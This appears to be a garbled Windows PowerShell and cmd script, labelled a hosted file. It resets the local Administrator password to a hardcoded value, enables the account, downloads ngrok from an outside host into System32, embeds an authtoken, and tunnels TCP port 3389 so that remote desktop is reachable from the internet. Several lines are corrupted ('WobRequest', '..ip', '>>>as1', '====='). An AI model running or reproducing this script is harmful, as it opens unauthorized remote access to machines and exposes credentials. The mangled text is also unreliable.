Hosted File:
Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "@rdpbyav321" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser 
iaHb/n-WobRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64..ip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exe C:\Windows\System32
cmd /c echo ./ngrok.exe authtoken "25yo94poOFBVmtBZhyB2AxyvDjE_5mKcax7WsWenrsN9ukBK5" >>>as1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd 

===== ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
